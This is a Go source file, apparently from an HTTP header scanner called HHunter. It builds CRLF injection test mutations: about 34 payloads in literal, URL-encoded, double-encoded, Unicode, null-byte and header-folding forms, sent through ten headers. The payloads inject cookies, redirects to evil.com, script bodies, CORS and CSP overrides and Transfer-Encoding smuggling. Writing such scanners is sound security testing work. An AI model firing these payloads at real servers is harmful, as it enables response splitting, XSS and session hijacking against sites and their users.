package headers

import "github.com/cc1a2b/HHunter/engine"

func GetCRLFMutations() []engine.Mutation {
	mutations := []engine.Mutation{}

	// CRLF injection payloads — inject headers via newline sequences
	crlfPayloads := []struct {
		payload string
		desc    string
	}{
		// Standard CRLF injection
		{"value\r\nInjected-Header: injected", "Standard CRLF injection"},
		{"value\r\n\r\n<script>alert(1)</script>", "CRLF + body injection (XSS)"},
		{"value\r\nSet-Cookie: hh_crlf=injected; Path=/", "CRLF cookie injection"},
		{"value\r\nLocation: https://evil.com", "CRLF redirect injection"},
		{"value\r\nContent-Type: text/html\r\n\r\n<h1>injected</h1>", "CRLF content-type + body"},
		{"value\r\nX-XSS-Protection: 0", "CRLF disable XSS protection"},
		{"value\r\nAccess-Control-Allow-Origin: *", "CRLF CORS injection"},
		{"value\r\nContent-Security-Policy: default-src *", "CRLF CSP bypass"},

		// URL-encoded CRLF
		{"value%0d%0aInjected-Header: injected", "URL-encoded CRLF"},
		{"value%0d%0aSet-Cookie: hh_crlf=injected", "URL-encoded CRLF cookie"},
		{"value%0d%0aLocation: https://evil.com", "URL-encoded CRLF redirect"},
		{"value%0d%0a%0d%0a<script>alert(1)</script>", "URL-encoded CRLF body XSS"},

		// Double URL-encoded
		{"value%250d%250aInjected-Header: injected", "Double URL-encoded CRLF"},
		{"value%250d%250aSet-Cookie: hh_crlf=injected", "Double URL-encoded CRLF cookie"},

		// Unicode/alternate encodings
		{"value%E5%98%8A%E5%98%8DInjected-Header: injected", "Unicode CRLF (UTF-8 encoded CR/LF)"},
		{"value\u000dInjected-Header: injected", "Unicode CR only"},
		{"value\u000aInjected-Header: injected", "Unicode LF only"},
		{"value\u0085Injected-Header: injected", "Unicode NEL (Next Line)"},
		{"value\u2028Injected-Header: injected", "Unicode Line Separator"},
		{"value\u2029Injected-Header: injected", "Unicode Paragraph Separator"},

		// Mixed encoding CRLF
		{"value%0d\nInjected-Header: injected", "Mixed encoded CR + literal LF"},
		{"value\r%0aInjected-Header: injected", "Literal CR + encoded LF"},

		// Null byte + CRLF
		{"value%00%0d%0aInjected-Header: injected", "Null byte + CRLF"},
		{"value\x00\r\nInjected-Header: injected", "Literal null + CRLF"},

		// Tab-based header injection
		{"value\tInjected-Header: injected", "Tab-based header injection"},
		{"value%09Injected-Header: injected", "URL-encoded tab injection"},

		// CRLF via HTTP/2 pseudo-header style
		{"value%0d%0a:authority: evil.com", "CRLF pseudo-header injection"},

		// Header folding (obsolete but some servers support)
		{"value\r\n Continuation-Value", "Header folding (obs-fold)"},
		{"value\r\n\tTab-Continuation", "Header folding with tab"},

		// CRLF in specific security-critical headers
		{"value\r\nX-Forwarded-For: 127.0.0.1", "CRLF XFF injection"},
		{"value\r\nAuthorization: Bearer admin_token", "CRLF auth injection"},
		{"value\r\nHost: evil.com", "CRLF host injection"},
		{"value\r\nX-Forwarded-Host: evil.com", "CRLF X-Forwarded-Host injection"},
		{"value\r\nTransfer-Encoding: chunked", "CRLF TE smuggling"},
	}

	// Headers to test CRLF injection through
	injectionPoints := []string{
		"X-Forwarded-Host",
		"X-Forwarded-For",
		"Referer",
		"User-Agent",
		"X-Custom-Header",
		"X-Original-URL",
		"X-Rewrite-URL",
		"X-Forwarded-Proto",
		"Destination",
		"X-Callback-URL",
	}

	for _, header := range injectionPoints {
		for _, p := range crlfPayloads {
			mutations = append(mutations, engine.Mutation{
				Header:   header,
				Value:    p.payload,
				Category: "CRLF",
				Impact:   "HTTP response splitting / header injection: " + p.desc,
			})
		}
	}

	return mutations
}
